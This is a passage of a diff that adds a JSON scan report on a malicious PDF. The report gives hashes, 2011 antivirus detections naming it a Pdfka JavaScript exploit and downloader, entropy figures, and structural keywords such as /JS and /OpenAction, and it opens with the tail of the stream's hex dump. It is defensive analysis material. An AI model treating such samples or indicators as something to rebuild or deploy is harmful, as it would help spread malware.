5E FE FC 6F 9D 5D 3F 71 0D 0A 65 6E 64 73 74 72 65 61 6D 0D 0A", 
+                    "id": 9, 
+                    "length": 2707, 
+                    "md5": "5eac5cdd93a95768c91dae24629e1b72", 
+                    "suspicious": 1, 
+                    "version": 0
+                }
+            ]
+        }
+    }, 
+    "hash_data": {
+        "file": {
+            "md5": "122ca0d4629ff12c3b0aa21bd18dbf08", 
+            "sha1": "0e89becf87b5aa7b68f1e463f47620de3995b1ee", 
+            "sha256": "01998715ab51a03cdaddff4ebe004da942ca3ae4e1357f3e1d5d5947b6e20624"
+        }
+    }, 
+    "related": "null", 
+    "scans": {
+        "virustotal": {
+            "permalink": "http://www.virustotal.com/file-scan/report.html?id=01998715ab51a03cdaddff4ebe004da942ca3ae4e1357f3e1d5d5947b6e20624-1300649382", 
+            "report": [
+                "2011-03-20 19:29:42", 
+                {
+                    "AVG": "JS/Dropper", 
+                    "AhnLab-V3": "", 
+                    "AntiVir": "HTML/Malicious.PDF.Gen", 
+                    "Antiy-AVL": "Exploit/JS.Pdfka", 
+                    "Avast": "JS:Pdfka-gen", 
+                    "Avast5": "JS:Pdfka-gen", 
+                    "BitDefender": "Exploit.PDF-JS.Gen", 
+                    "CAT-QuickHeal": "Exploit.PDF.Malicious.Gen", 
+                    "ClamAV": "", 
+                    "Commtouch": "PDF/Obfusc.F!Camelot", 
+                    "Comodo": "TrojWare.JS.Exploit.Pdfka.vn", 
+                    "DrWeb": "Exploit.PDF.869", 
+                    "Emsisoft": "", 
+                    "F-Prot": "JS/Crypted.DT", 
+                    "F-Secure": "Exploit.PDF-JS.Gen", 
+                    "Fortinet": "JS/Crypt.PDA!tr", 
+                    "GData": "Exploit.PDF-JS.Gen", 
+                    "Ikarus": "", 
+                    "Jiangmin": "", 
+                    "K7AntiVirus": "", 
+                    "Kaspersky": "Exploit.JS.Pdfka.vn", 
+                    "McAfee": "Exploit-PDF.q.gen!stream", 
+                    "McAfee-GW-Edition": "Heuristic.BehavesLike.PDF.Suspicious.C", 
+                    "Microsoft": "Exploit:Win32/Pidief.O", 
+                    "NOD32": "JS/Exploit.Pdfka.NLY", 
+                    "Norman": "JS/Shellcode.AA", 
+                    "PCTools": "Downloader.Generic", 
+                    "Panda": "Exploit/PDF.Gen.B", 
+                    "Prevx": "", 
+                    "Rising": "", 
+                    "SUPERAntiSpyware": "", 
+                    "Sophos": "Mal/PdfEx-C", 
+                    "Symantec": "Downloader", 
+                    "TheHacker": "", 
+                    "TrendMicro": "JS_PIDIEF.SMC", 
+                    "TrendMicro-HouseCall": "JS_PIDIEF.SMC", 
+                    "VBA32": "Exploit.JS.Pdfka.vn", 
+                    "VIPRE": "Exploit.PDF-JS.Gen (v)", 
+                    "ViRobot": "JS.Pdfka.2996", 
+                    "VirusBuster": "JS.Pdfka.Gen.28", 
+                    "eSafe": "", 
+                    "eTrust-Vet": "PDF/Pidief.ML", 
+                    "nProtect": ""
+                }
+            ], 
+            "result": 1
+        }, 
+        "wepawet": "null"
+    }, 
+    "scores": {
+        "primary": "5", 
+        "secondary": "0", 
+        "total": "5"
+    }, 
+    "structure": {
+        "components": {
+            "component": [
+                {
+                    "count": 4, 
+                    "hexcodecount": 0, 
+                    "name": "obj"
+                }, 
+                {
+                    "count": 4, 
+                    "hexcodecount": 0, 
+                    "name": "endobj"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "stream"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "endstream"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "trailer"
+                }
+            ]
+        }, 
+        "countChatAfterLastEof": "0", 
+        "countEof": "0", 
+        "dates": {
+            "date": []
+        }, 
+        "entropy": "", 
+        "errorMessage": "", 
+        "errorOccured": "False", 
+        "filename": "/home/bsdixon/PDFs/files/122ca0d4629ff12c3b0aa21bd18dbf08.pdf.vir", 
+        "filesize": "2996", 
+        "header": "%PDF-1.3", 
+        "isPdf": "True", 
+        "keywords": {
+            "keyword": [
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Page"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/JS"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/JavaScript"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/OpenAction"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Catalog"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Count"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Filter"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/FlateDecode"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/H"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Kids"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Length"
+                }, 
+                {
+                    "count": 2, 
+                    "hexcodecount": 0, 
+                    "name": "/Pages"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Parent"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/Root"
+                }, 
+                {
+                    "count": 1, 
+                    "hexcodecount": 0, 
+                    "name": "/S"
+                }, 
+                {
+                    "count": 3, 
+                    "hexcodecount": 0, 
+                    "name": "/Type"
+                }
+            ]
+        }, 
+        "nonStreamEntropy": "4.950965", 
+        "streamEntropy": "7.857871", 
+        "totalEntropy": "7.811359", 
+        "version": "0.0.11"
+    }
 }
 
